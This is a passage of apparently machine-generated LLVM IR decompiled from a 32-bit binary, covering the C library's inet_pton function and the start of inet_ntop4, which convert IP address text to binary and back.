define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80573ca = load i32, i32* @ebp, align 4
  %v0_80573cb = load i32, i32* @edi, align 4
  %v0_80573cc = load i32, i32* @esi, align 4
  %v0_80573cd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80573d5 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80573d5, i32* @edi, align 4
  %v9_80573d9 = icmp eq i32 %arg1, 2
  br i1 %v9_80573d9, label %dec_label_pc_80573e9, label %dec_label_pc_80573de

dec_label_pc_80573de:                             ; preds = %entry
  %v9_80573de = icmp eq i32 %arg1, 10
  %v1_80573e1 = icmp eq i1 %v9_80573de, false
  br i1 %v1_80573e1, label %dec_label_pc_805757a, label %dec_label_pc_80573f9

dec_label_pc_80573e9:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80573d5, i32* @eax, align 4
  %v3_80573ef = call i32 @inet_pton4(i32 %v0_80573cd, i32 %v0_80573cc, i32 %v0_80573cb)
  store i32 %v3_80573ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805758c

dec_label_pc_80573f9:                             ; preds = %dec_label_pc_80573de
  %v2_80573fe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80573fe, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8057403 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8057403, i32* @ebx, align 4
  %v2_805740a = add i32 %v5_8057403, 16
  store i32 %v2_805740a, i32* %eax.global-to-local, align 4
  %v0_8057414 = load i32, i32* @edi, align 4
  %v1_8057414 = inttoptr i32 %v0_8057414 to i8*
  %v2_8057414 = load i8, i8* %v1_8057414, align 1
  %v11_8057414 = icmp eq i8 %v2_8057414, 58
  %v1_8057417 = icmp eq i1 %v11_8057414, false
  br i1 %v1_8057417, label %dec_label_pc_80574aa, label %dec_label_pc_8057419

dec_label_pc_8057419:                             ; preds = %dec_label_pc_80573f9
  %v1_8057419 = add i32 %v0_8057414, 1
  store i32 %v1_8057419, i32* @edi, align 4
  %v1_805741a = inttoptr i32 %v1_8057419 to i8*
  %v2_805741a = load i8, i8* %v1_805741a, align 1
  %v11_805741a = icmp eq i8 %v2_805741a, 58
  %v1_805741d = icmp eq i1 %v11_805741a, false
  br i1 %v1_805741d, label %dec_label_pc_805758a, label %dec_label_pc_80574aa

dec_label_pc_8057431:                             ; preds = %dec_label_pc_80574ea
  %v0_8057432 = load i32, i32* @edi, align 4
  %v1_8057432 = add i32 %v0_8057432, 1
  store i32 %v1_8057432, i32* @edi, align 4
  %v4_805743a = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805b534.572, i32 0, i32 0), i32 %v2_80574f1)
  store i32 %v4_805743a, i32* %eax.global-to-local, align 4
  %v1_8057442 = icmp eq i32 %v4_805743a, 0
  br i1 %v1_8057442, label %dec_label_pc_8057461, label %dec_label_pc_8057446

dec_label_pc_8057446:                             ; preds = %dec_label_pc_8057431
  %v0_8057446 = load i32, i32* @ebp, align 4
  %v2_8057446 = mul i32 %v0_8057446, 16
  %v1_8057449 = add i32 %v4_805743a, -134591796
  store i32 %v1_8057449, i32* %eax.global-to-local, align 4
  %v2_805744e = or i32 %v2_8057446, %v1_8057449
  store i32 %v2_805744e, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_805744e, 65536
  br i1 %tmp, label %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge, label %dec_label_pc_805758a

dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge: ; preds = %dec_label_pc_8057446
  %v0_80574ea.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80574ea.outer

dec_label_pc_80574ea.outer:                       ; preds = %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge, %dec_label_pc_80574aa
  %v0_80574ea.pre = phi i32 [ %v0_80574ea.pre.pre, %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_80574aa ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_80574aa ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_80574aa ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8057446.dec_label_pc_80574ea.outer_crit_edge ], [ 0, %dec_label_pc_80574aa ]
  %v4_8057466 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805746b = icmp eq i1 %v4_8057466, false
  br label %dec_label_pc_80574ea

dec_label_pc_8057461:                             ; preds = %dec_label_pc_8057431
  %v0_8057461 = load i32, i32* @esi, align 4
  %v9_8057461 = icmp eq i32 %v0_8057461, 58
  %v1_8057464 = icmp eq i1 %v9_8057461, false
  br i1 %v1_8057464, label %dec_label_pc_80574b6, label %dec_label_pc_8057466

dec_label_pc_8057466:                             ; preds = %dec_label_pc_8057461
  br i1 %v1_805746b, label %dec_label_pc_8057482, label %dec_label_pc_805746d

dec_label_pc_805746d:                             ; preds = %dec_label_pc_8057466
  %v5_805746d = icmp eq i8* %stack_var_-44.1, null
  %v1_8057472 = icmp eq i1 %v5_805746d, false
  br i1 %v1_8057472, label %dec_label_pc_805758a, label %dec_label_pc_8057478

dec_label_pc_8057478:                             ; preds = %dec_label_pc_805746d
  %v0_8057478 = load i32, i32* @ebx, align 4
  %v5_8057478 = inttoptr i32 %v0_8057478 to i8*
  %v0_805747c = load i32, i32* @edi, align 4
  %v5_805747c = inttoptr i32 %v0_805747c to i8*
  br label %dec_label_pc_80574ea

dec_label_pc_8057482:                             ; preds = %dec_label_pc_8057466
  %v0_8057482 = load i32, i32* @edi, align 4
  %v1_8057482 = inttoptr i32 %v0_8057482 to i8*
  %v2_8057482 = load i8, i8* %v1_8057482, align 1
  %v3_8057482 = icmp eq i8 %v2_8057482, 0
  br i1 %v3_8057482, label %dec_label_pc_805758a, label %dec_label_pc_805748b

dec_label_pc_805748b:                             ; preds = %dec_label_pc_8057482
  %v0_805748b = load i32, i32* @ebx, align 4
  %v1_805748b = add i32 %v0_805748b, 2
  store i32 %v1_805748b, i32* @edx, align 4
  %v6_8057492 = icmp ugt i32 %v1_805748b, %v2_805740a
  br i1 %v6_8057492, label %dec_label_pc_805758a, label %dec_label_pc_8057498

dec_label_pc_8057498:                             ; preds = %dec_label_pc_805748b
  %v0_8057498 = load i32, i32* @ebp, align 4
  %v2_805749a = udiv i32 %v0_8057498, 256
  %v4_805749a = trunc i32 %v2_805749a to i8
  %v3_805749d = inttoptr i32 %v0_805748b to i8*
  store i8 %v4_805749a, i8* %v3_805749d, align 1
  %v0_805749f = load i32, i32* @ebp, align 4
  store i32 %v0_805749f, i32* %eax.global-to-local, align 4
  %v1_80574a1 = trunc i32 %v0_805749f to i8
  %v2_80574a1 = load i32, i32* @ebx, align 4
  %v3_80574a1 = add i32 %v2_80574a1, 1
  %v4_80574a1 = inttoptr i32 %v3_80574a1 to i8*
  store i8 %v1_80574a1, i8* %v4_80574a1, align 1
  %v0_80574a4 = load i32, i32* @edx, align 4
  store i32 %v0_80574a4, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80574aa

dec_label_pc_80574aa:                             ; preds = %dec_label_pc_80573f9, %dec_label_pc_8057419, %dec_label_pc_8057498
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8057498 ], [ %v1_8057419, %dec_label_pc_8057419 ], [ %v0_8057414, %dec_label_pc_80573f9 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057498 ], [ null, %dec_label_pc_8057419 ], [ null, %dec_label_pc_80573f9 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80574ea.outer

dec_label_pc_80574b6:                             ; preds = %dec_label_pc_8057461
  %v9_80574b6 = icmp eq i32 %v0_8057461, 46
  %v1_80574b9 = icmp eq i1 %v9_80574b6, false
  br i1 %v1_80574b9, label %dec_label_pc_805758a, label %dec_label_pc_80574bf

dec_label_pc_80574bf:                             ; preds = %dec_label_pc_80574b6
  %v0_80574bf = load i32, i32* @ebx, align 4
  %v1_80574bf = add i32 %v0_80574bf, 4
  store i32 %v1_80574bf, i32* @esi, align 4
  %v6_80574c6 = icmp ugt i32 %v1_80574bf, %v2_805740a
  br i1 %v6_80574c6, label %dec_label_pc_805758a, label %dec_label_pc_80574cc

dec_label_pc_80574cc:                             ; preds = %dec_label_pc_80574bf
  %v4_80574cc = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80574cc, i32* @eax, align 4
  store i32 %v0_80574bf, i32* @edx, align 4
  store i32 %v1_80574bf, i32* @ebx, align 4
  %v2_80574d4 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80574d4 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80574d4, i32 %v2_805740a)
  store i32 %v5_80574d4, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_80574d4, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8057521, label %dec_label_pc_805758a

dec_label_pc_80574ea:                             ; preds = %dec_label_pc_80574ea.outer, %dec_label_pc_8057478
  %v0_80574ea = phi i32 [ %v0_805747c, %dec_label_pc_8057478 ], [ %v0_80574ea.pre, %dec_label_pc_80574ea.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8057478, %dec_label_pc_8057478 ], [ %stack_var_-44.1.ph, %dec_label_pc_80574ea.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805747c, %dec_label_pc_8057478 ], [ %stack_var_-36.1.ph, %dec_label_pc_80574ea.outer ]
  %v1_80574ea = inttoptr i32 %v0_80574ea to i8*
  %v2_80574ea = load i8, i8* %v1_80574ea, align 1
  %v3_80574ea = sext i8 %v2_80574ea to i32
  store i32 %v3_80574ea, i32* %eax.global-to-local, align 4
  %v2_80574f1 = call i32 @__GI_tolower(i32 %v3_80574ea)
  store i32 %v2_80574f1, i32* %eax.global-to-local, align 4
  %v1_80574f9 = icmp eq i32 %v2_80574f1, 0
  store i32 %v2_80574f1, i32* @esi, align 4
  %v1_80574fd = icmp eq i1 %v1_80574f9, false
  br i1 %v1_80574fd, label %dec_label_pc_8057431, label %dec_label_pc_8057503

dec_label_pc_8057503:                             ; preds = %dec_label_pc_80574ea
  br i1 %v4_8057466, label %dec_label_pc_8057521, label %dec_label_pc_805750a

dec_label_pc_805750a:                             ; preds = %dec_label_pc_8057503
  %v0_805750a = load i32, i32* @ebx, align 4
  %v1_805750a = add i32 %v0_805750a, 2
  store i32 %v1_805750a, i32* @edx, align 4
  %v6_8057511 = icmp ugt i32 %v1_805750a, %v2_805740a
  br i1 %v6_8057511, label %dec_label_pc_805758a, label %dec_label_pc_8057513

dec_label_pc_8057513:                             ; preds = %dec_label_pc_805750a
  %v0_8057513 = load i32, i32* @ebp, align 4
  %v2_8057515 = udiv i32 %v0_8057513, 256
  %v4_8057515 = trunc i32 %v2_8057515 to i8
  %v3_8057518 = inttoptr i32 %v0_805750a to i8*
  store i8 %v4_8057515, i8* %v3_8057518, align 1
  %v0_805751a = load i32, i32* @ebp, align 4
  store i32 %v0_805751a, i32* %eax.global-to-local, align 4
  %v1_805751c = trunc i32 %v0_805751a to i8
  %v2_805751c = load i32, i32* @ebx, align 4
  %v3_805751c = add i32 %v2_805751c, 1
  %v4_805751c = inttoptr i32 %v3_805751c to i8*
  store i8 %v1_805751c, i8* %v4_805751c, align 1
  %v0_805751f = load i32, i32* @edx, align 4
  store i32 %v0_805751f, i32* @ebx, align 4
  br label %dec_label_pc_8057521

dec_label_pc_8057521:                             ; preds = %dec_label_pc_8057503, %dec_label_pc_80574cc, %dec_label_pc_8057513
  %v4_8057521 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057521 = icmp eq i8* %stack_var_-44.1, null
  %v0_8057559.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8057521, label %dec_label_pc_8057559, label %dec_label_pc_8057528

dec_label_pc_8057528:                             ; preds = %dec_label_pc_8057521
  store i32 1, i32* @esi, align 4
  %v6_805752f = sub i32 %v0_8057559.pre, %v4_8057521
  store i32 %v6_805752f, i32* @edi, align 4
  %v16_8057533 = icmp eq i32 %v0_8057559.pre, %v2_805740a
  %v1_8057537 = icmp eq i1 %v16_8057533, false
  br i1 %v1_8057537, label %dec_label_pc_8057551.preheader, label %dec_label_pc_805758a

dec_label_pc_8057551.preheader:                   ; preds = %dec_label_pc_8057528
  %v3_805755188 = inttoptr i32 %v6_805752f to i8*
  %v9_805755397 = icmp slt i8* %v3_805755188, inttoptr (i32 1 to i8*)
  br i1 %v9_805755397, label %dec_label_pc_8057555, label %dec_label_pc_805753b

dec_label_pc_805753b:                             ; preds = %dec_label_pc_8057551.preheader, %dec_label_pc_805753b
  %v0_805754999 = phi i32 [ %v0_8057551.pre, %dec_label_pc_805753b ], [ 1, %dec_label_pc_8057551.preheader ]
  %v0_805753b98 = phi i32 [ %v1_8057551.pre, %dec_label_pc_805753b ], [ %v6_805752f, %dec_label_pc_8057551.preheader ]
  %v2_8057541 = sub i32 %v0_805753b98, %v0_805754999
  %v6_8057543 = add i32 %v2_8057541, %v4_8057521
  store i32 %v6_8057543, i32* %eax.global-to-local, align 4
  %v2_8057547 = sub i32 %v2_805740a, %v0_805754999
  store i32 %v2_8057547, i32* @ecx, align 4
  %v1_8057549 = add i32 %v0_805754999, 1
  store i32 %v1_8057549, i32* @esi, align 4
  %v1_805754a = inttoptr i32 %v6_8057543 to i8*
  %v2_805754a = load i8, i8* %v1_805754a, align 1
  %v3_805754a = zext i8 %v2_805754a to i32
  %v4_805754a = load i32, i32* @edx, align 4
  %v5_805754a = and i32 %v4_805754a, -256
  %v6_805754a = or i32 %v5_805754a, %v3_805754a
  store i32 %v6_805754a, i32* @edx, align 4
  %v3_805754c = inttoptr i32 %v2_8057547 to i8*
  store i8 %v2_805754a, i8* %v3_805754c, align 1
  %v0_805754e = load i32, i32* %eax.global-to-local, align 4
  %v1_805754e = inttoptr i32 %v0_805754e to i8*
  store i8 0, i8* %v1_805754e, align 1
  %v0_8057551.pre = load i32, i32* @esi, align 4
  %v1_8057551.pre = load i32, i32* @edi, align 4
  %v2_8057551 = inttoptr i32 %v0_8057551.pre to i8*
  %v3_8057551 = inttoptr i32 %v1_8057551.pre to i8*
  %v9_8057553 = icmp sgt i8* %v2_8057551, %v3_8057551
  br i1 %v9_8057553, label %dec_label_pc_8057555, label %dec_label_pc_805753b

dec_label_pc_8057555:                             ; preds = %dec_label_pc_805753b, %dec_label_pc_8057551.preheader
  br label %dec_label_pc_8057559

dec_label_pc_8057559:                             ; preds = %dec_label_pc_8057521, %dec_label_pc_8057555
  %v0_8057559 = phi i32 [ %v2_805740a, %dec_label_pc_8057555 ], [ %v0_8057559.pre, %dec_label_pc_8057521 ]
  %v16_8057559 = icmp eq i32 %v0_8057559, %v2_805740a
  %v1_805755d = icmp eq i1 %v16_8057559, false
  br i1 %v1_805755d, label %dec_label_pc_805758a, label %dec_label_pc_805755f

dec_label_pc_805755f:                             ; preds = %dec_label_pc_8057559
  store i32 %v2_80573fe, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_805756b = call i32 @memcpy(i16* %tmp63, i32 %v2_80573fe, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805758c

dec_label_pc_805757a:                             ; preds = %dec_label_pc_80573de
  %v1_805757a = call i32 @__errno_location(i32 %v0_80573cd)
  %v1_805757f = inttoptr i32 %v1_805757a to i32*
  store i32 97, i32* %v1_805757f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805758c

dec_label_pc_805758a:                             ; preds = %dec_label_pc_805748b, %dec_label_pc_8057482, %dec_label_pc_8057446, %dec_label_pc_805746d, %dec_label_pc_8057528, %dec_label_pc_80574cc, %dec_label_pc_8057559, %dec_label_pc_805750a, %dec_label_pc_80574bf, %dec_label_pc_80574b6, %dec_label_pc_8057419
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805758c

dec_label_pc_805758c:                             ; preds = %dec_label_pc_805757a, %dec_label_pc_805755f, %dec_label_pc_80573e9, %dec_label_pc_805758a
  %v0_8057593 = phi i32 [ -1, %dec_label_pc_805757a ], [ 1, %dec_label_pc_805755f ], [ %v3_80573ef, %dec_label_pc_80573e9 ], [ 0, %dec_label_pc_805758a ]
  store i32 %v0_80573cd, i32* @ebx, align 4
  store i32 %v0_80573cc, i32* @esi, align 4
  store i32 %v0_80573cb, i32* @edi, align 4
  store i32 %v0_80573ca, i32* @ebp, align 4
  ret i32 %v0_8057593

; uselistorder directives
  uselistorder i32 %v1_8057551.pre, { 1, 0 }
  uselistorder i32 %v0_8057551.pre, { 1, 0 }
  uselistorder i32 %v0_805754999, { 2, 1, 0 }
  uselistorder i32 %v0_8057559.pre, { 1, 0, 2 }
  uselistorder i32 %v2_80574f1, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_805740a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_80573cd, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805758c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805758a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057559, { 1, 0 }
  uselistorder label %dec_label_pc_805753b, { 1, 0 }
  uselistorder label %dec_label_pc_8057521, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80574ea, { 1, 0 }
  uselistorder label %dec_label_pc_80574aa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80574ea.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8057595 = load i32, i32* @edi, align 4
  %v0_8057596 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_805759a = ptrtoint i32* %stack_var_-76 to i32
  %v0_805759d = load i32, i32* @eax, align 4
  %v3_80575a1 = and i32 %v0_805759d, -65536
  %v2_80575a7 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_80575ac = load i32, i32* @edx, align 4
  %v5_80575ac = inttoptr i32 %v0_80575ac to i8*
  store i8* %v5_80575ac, i8** %stack_var_-56, align 4
  %v0_80575b0 = load i32, i32* @ecx, align 4
  store i32 %v3_80575a1, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80575bb = add i32 %v2_80575a7, 4
  store i32 %v6_80575bb, i32* %edi.global-to-local, align 4
  %v2_80575bc = inttoptr i32 %v6_80575bb to i32*
  store i32 0, i32* %v2_80575bc, align 4
  %v3_80575bc = load i32, i32* %edi.global-to-local, align 4
  %v6_80575bc = add i32 %v3_80575bc, 4
  store i32 %v6_80575bc, i32* %edi.global-to-local, align 4
  %v0_80575bd = load i32, i32* %eax.global-to-local, align 4
  %v2_80575bd = inttoptr i32 %v6_80575bc to i32*
  store i32 %v0_80575bd, i32* %v2_80575bd, align 4
  %v3_80575bd = load i32, i32* %edi.global-to-local, align 4
  %v6_80575bd = add i32 %v3_80575bd, 4
  store i32 %v6_80575bd, i32* %edi.global-to-local, align 4
  %v0_80575be = load i32, i32* %eax.global-to-local, align 4
  %v1_80575be = trunc i32 %v0_80575be to i16
  %v3_80575be = inttoptr i32 %v6_80575bd to i16*
  store i16 %v1_80575be, i16* %v3_80575be, align 2
  %v4_80575be = load i32, i32* %edi.global-to-local, align 4
  %v7_80575be = add i32 %v4_80575be, 2
  %v0_80575c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80575c0 = trunc i32 %v0_80575c0 to i8
  %v3_80575c0 = inttoptr i32 %v7_80575be to i8*
  store i8 %v1_80575c0, i8* %v3_80575c0, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805765b30 = load i32, i32* @esi, align 4
  %v10_805765b36 = icmp eq i32 %v0_805765b30, 3
  store i1 %v10_805765b36, i1* %zf.global-to-local, align 1
  %v7_805765e38 = icmp sgt i32 %v0_805765b30, 3
  br i1 %v7_805765e38, label %dec_label_pc_8057664, label %dec_label_pc_80575c8

dec_label_pc_80575c8:                             ; preds = %dec_label_pc_805763b, %entry
  %v3_80575de = phi i32 [ 0, %entry ], [ %v1_8057664.pre, %dec_label_pc_805763b ]
  %v0_805765b39 = phi i32 [ %v0_805765b30, %entry ], [ %v0_805765b, %dec_label_pc_805763b ]
  %v2_80575ce = add i32 %v0_805765b39, %v0_805759d
  %v12_80575ce = icmp eq i32 %v2_80575ce, 0
  store i1 %v12_80575ce, i1* %zf.global-to-local, align 1
  store i32 %v2_80575ce, i32* %ebp.global-to-local, align 4
  %v1_80575d0 = inttoptr i32 %v2_80575ce to i8*
  %v2_80575d0 = load i8, i8* %v1_80575d0, align 1
  %v3_80575d0 = zext i8 %v2_80575d0 to i32
  %v4_80575d0 = load i32, i32* @edx, align 4
  %v5_80575d0 = and i32 %v4_80575d0, -65536
  %v6_80575d0 = or i32 %v5_80575d0, %v3_80575d0
  store i32 %v6_80575d0, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_80575d0, 100
  %v6_80575d7 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_80575d0, 100
  %v12_80575d7 = zext i8 %tmp24 to i32
  %v14_80575d7 = mul nuw nsw i32 %v12_80575d7, 256
  %v15_80575d7 = or i32 %v6_80575d7, %v5_80575d0
  %v16_80575d7 = or i32 %v15_80575d7, %v14_80575d7
  store i32 %v16_80575d7, i32* %eax.global-to-local, align 4
  %v2_80575db = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_80575de = load i32, i32* @esp, align 4
  %v4_80575de = add i32 %v2_80575de, 43
  %v5_80575de = add i32 %v4_80575de, %v3_80575de
  %v6_80575de = inttoptr i32 %v5_80575de to i8*
  store i8 %v2_80575db, i8* %v6_80575de, align 1
  %v0_80575e2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80575e2 = add i32 %v0_80575e2, 1
  store i32 %v0_80575e2, i32* @ecx, align 4
  %v0_80575eb = load i32, i32* @esp, align 4
  %v2_80575eb = add i32 %v0_80575e2, 43
  %v3_80575eb = add i32 %v2_80575eb, %v0_80575eb
  %v4_80575eb = inttoptr i32 %v3_80575eb to i8*
  %v5_80575eb = load i8, i8* %v4_80575eb, align 1
  %v11_80575eb = icmp eq i8 %v5_80575eb, 48
  store i1 %v11_80575eb, i1* %zf.global-to-local, align 1
  %v1_80575f0 = icmp eq i1 %v11_80575eb, false
  %v0_805761a = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_80575f0, label %dec_label_pc_8057618, label %dec_label_pc_80575f2

dec_label_pc_80575f2:                             ; preds = %dec_label_pc_80575c8
  %v3_80575f6 = trunc i32 %v0_805761a to i16
  %v5_80575f6 = udiv i16 %v3_80575f6, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_80575f6, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8057608 = trunc i16 %tmp42 to i8
  %v2_8057608 = or i8 %v1_8057608, 48
  %v12_8057608 = zext i8 %v2_8057608 to i32
  store i32 %v12_8057608, i32* %eax.global-to-local, align 4
  %v7_805760a = icmp eq i8 %v1_8057608, 0
  store i1 %v7_805760a, i1* %zf.global-to-local, align 1
  store i8 %v2_8057608, i8* %v4_80575eb, align 1
  %v0_8057610 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8057610, label %dec_label_pc_805763b, label %dec_label_pc_8057612

dec_label_pc_8057612:                             ; preds = %dec_label_pc_80575f2
  store i32 %v1_80575e2, i32* @ecx, align 4
  br label %dec_label_pc_805763b

dec_label_pc_8057618:                             ; preds = %dec_label_pc_80575c8
  store i32 %v1_80575e2, i32* %ebx.global-to-local, align 4
  %v3_8057620 = trunc i32 %v0_805761a to i16
  %v5_8057620 = udiv i16 %v3_8057620, 10
  %tmp43 = urem i16 %v5_8057620, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8057630 = add i32 %v0_80575e2, 2
  store i32 %v1_8057630, i32* @ecx, align 4
  %v1_8057635 = trunc i16 %tmp44 to i8
  %v2_8057635 = or i8 %v1_8057635, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8057635 = zext i8 %v2_8057635 to i32
  store i32 %v12_8057635, i32* %eax.global-to-local, align 4
  %v4_8057637 = add i32 %v0_80575e2, 44
  %v5_8057637 = add i32 %v4_8057637, %v0_80575eb
  %v6_8057637 = inttoptr i32 %v5_8057637 to i8*
  store i8 %v2_8057635, i8* %v6_8057637, align 1
  br label %dec_label_pc_805763b

dec_label_pc_805763b:                             ; preds = %dec_label_pc_80575f2, %dec_label_pc_8057612, %dec_label_pc_8057618
  %v0_805763b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805763b = inttoptr i32 %v0_805763b to i8*
  %v2_805763b = load i8, i8* %v1_805763b, align 1
  %v3_805763b = zext i8 %v2_805763b to i32
  store i32 %v3_805763b, i32* %eax.global-to-local, align 4
  %v0_8057644 = load i32, i32* @esi, align 4
  %v1_8057644 = add i32 %v0_8057644, 1
  store i32 %v1_8057644, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057649 = load i32, i32* @esp, align 4
  %v1_8057649 = load i32, i32* @ecx, align 4
  %v2_8057649 = add i32 %v0_8057649, 44
  %v3_8057649 = add i32 %v2_8057649, %v1_8057649
  %v4_8057649 = inttoptr i32 %v3_8057649 to i8*
  store i8 46, i8* %v4_8057649, align 1
  %v0_805764e = load i32, i32* @ecx, align 4
  %v1_805764e = add i32 %v0_805764e, 2
  store i32 %v1_805764e, i32* %edi.global-to-local, align 4
  %v0_8057651 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057651 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057651 = zext i32 %v1_8057651 to i64
  %v3_8057651 = load i32, i32* %edx.global-to-local, align 4
  %v4_8057651 = zext i32 %v3_8057651 to i64
  %v5_8057651 = mul nuw i64 %v4_8057651, 4294967296
  %v6_8057651 = or i64 %v5_8057651, %v2_8057651
  %v7_8057651 = zext i32 %v0_8057651 to i64
  %v8_8057651 = udiv i64 %v6_8057651, %v7_8057651
  %v9_8057651 = trunc i64 %v8_8057651 to i32
  %v10_8057651 = urem i64 %v6_8057651, %v7_8057651
  %v11_8057651 = trunc i64 %v10_8057651 to i32
  store i32 %v11_8057651, i32* @edx, align 4
  %v3_8057653 = and i32 %v9_8057651, -256
  %v1_8057655 = trunc i64 %v10_8057651 to i8
  %v2_8057655 = add i8 %v1_8057655, 48
  %v12_8057655 = zext i8 %v2_8057655 to i32
  %v15_8057655 = or i32 %v12_8057655, %v3_8057653
  store i32 %v15_8057655, i32* %eax.global-to-local, align 4
  %v2_8057657 = load i32, i32* @esp, align 4
  %v4_8057657 = add i32 %v0_805764e, 43
  %v5_8057657 = add i32 %v4_8057657, %v2_8057657
  %v6_8057657 = inttoptr i32 %v5_8057657 to i8*
  store i8 %v2_8057655, i8* %v6_8057657, align 1
  %v0_805765b = load i32, i32* @esi, align 4
  %v10_805765b = icmp eq i32 %v0_805765b, 3
  store i1 %v10_805765b, i1* %zf.global-to-local, align 1
  %v7_805765e = icmp sgt i32 %v0_805765b, 3
  %v1_8057664.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_805765e, label %dec_label_pc_8057664, label %dec_label_pc_80575c8

dec_label_pc_8057664:                             ; preds = %dec_label_pc_805763b, %entry
  %v1_8057664 = phi i32 [ 0, %entry ], [ %v1_8057664.pre, %dec_label_pc_805763b ]
  %v0_8057664 = load i32, i32* @esp, align 4
  %v2_8057664 = add i32 %v0_8057664, 42
